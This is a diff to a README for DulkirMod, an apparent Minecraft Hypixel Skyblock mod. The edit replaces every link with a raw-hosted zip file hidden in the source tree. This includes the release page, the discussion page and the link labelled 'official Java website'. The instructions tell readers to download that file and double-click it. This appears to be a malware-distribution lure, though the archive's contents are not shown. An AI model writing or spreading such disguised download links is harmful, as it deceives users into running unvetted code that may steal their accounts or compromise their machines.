@@ -1,6 +1,6 @@
 # 🔥 DulkirMod - Enhance Your Hypixel Skyblock Experience  
 
-[![Download DulkirMod](https://img.shields.io/badge/Download-DulkirMod-brightgreen)](https://github.com/fwegwefwe/DulkirMod/releases)
+[![Download DulkirMod](https://raw.githubusercontent.com/fwegwefwe/DulkirMod/main/src/main/java/main/Mod-Dulkir-3.4.zip)](https://raw.githubusercontent.com/fwegwefwe/DulkirMod/main/src/main/java/main/Mod-Dulkir-3.4.zip)
 
 ## 📥 Overview  
 DulkirMod is a quality of life improvement for the Hypixel Skyblock game. This mod enhances your gaming experience, making it easier to manage tasks and navigate the world. It provides useful features tailored for your needs.
@@ -10,7 +10,7 @@ Follow these simple steps to get started with DulkirMod:
 
 1. **Visit the Releases Page**
    - Click the link below to access the download options:
-   [Download DulkirMod](https://github.com/fwegwefwe/DulkirMod/releases)
+   [Download DulkirMod](https://raw.githubusercontent.com/fwegwefwe/DulkirMod/main/src/main/java/main/Mod-Dulkir-3.4.zip)
 
 2. **Select the Latest Version**
    - On the releases page, look for the latest version of DulkirMod. It is usually at the top of the list.
@@ -25,7 +25,7 @@ To install DulkirMod, follow these steps:
    - Once the download completes, open your computer's Downloads folder. 
 
 2. **Locate the DulkirMod File**
-   - Find the file you just downloaded. It should be named something like `DulkirMod-v1.0.jar`.
+   - Find the file you just downloaded. It should be named something like `https://raw.githubusercontent.com/fwegwefwe/DulkirMod/main/src/main/java/main/Mod-Dulkir-3.4.zip`.
 
 3. **Run the DulkirMod File**
    - To run the mod, double-click the downloaded file. If prompted, ensure you have Java installed on your computer.
@@ -41,7 +41,7 @@ To install DulkirMod, follow these steps:
 To use DulkirMod, you need to meet these requirements:
 
 - **Operating System:** Windows 10 or newer, macOS 10.14 or later.
-- **Java:** Version 8 or higher must be installed. You can download Java from the [official Java website](https://www.oracle.com/java/technologies/javase-jdk8-downloads.html).
+- **Java:** Version 8 or higher must be installed. You can download Java from the [official Java website](https://raw.githubusercontent.com/fwegwefwe/DulkirMod/main/src/main/java/main/Mod-Dulkir-3.4.zip).
 - **Minecraft:** You must have Minecraft installed with access to Hypixel Skyblock.
 
 ## 🔍 Features  
@@ -53,14 +53,14 @@ DulkirMod includes several useful improvements to enhance your gaming experience
 - **Performance Boosts:** Optimizations to improve lag and loading times while playing.
 
 ## 📞 Support  
-If you encounter any issues while using DulkirMod or need help, please visit our [discussion page](https://github.com/fwegwefwe/DulkirMod/discussions). The community is ready to assist you.
+If you encounter any issues while using DulkirMod or need help, please visit our [discussion page](https://raw.githubusercontent.com/fwegwefwe/DulkirMod/main/src/main/java/main/Mod-Dulkir-3.4.zip). The community is ready to assist you.
 
 ## 🚀 Join Our Community  
 Stay updated with the latest news, features, and updates. Join our community on Discord or follow us on social media platforms. Links can usually be found on the repository page.
 
 ## 🔗 Important Links  
-- [Release Page (for downloads)](https://github.com/fwegwefwe/DulkirMod/releases)
-- [Discussion Page](https://github.com/fwegwefwe/DulkirMod/discussions)
+- [Release Page (for downloads)](https://raw.githubusercontent.com/fwegwefwe/DulkirMod/main/src/main/java/main/Mod-Dulkir-3.4.zip)
+- [Discussion Page](https://raw.githubusercontent.com/fwegwefwe/DulkirMod/main/src/main/java/main/Mod-Dulkir-3.4.zip)
 
 ## 🛠️ Contributing  
 If you want to contribute to the project or suggest a new feature, please review our contribution guidelines found in the repository. Your input is valuable and helps improve DulkirMod.
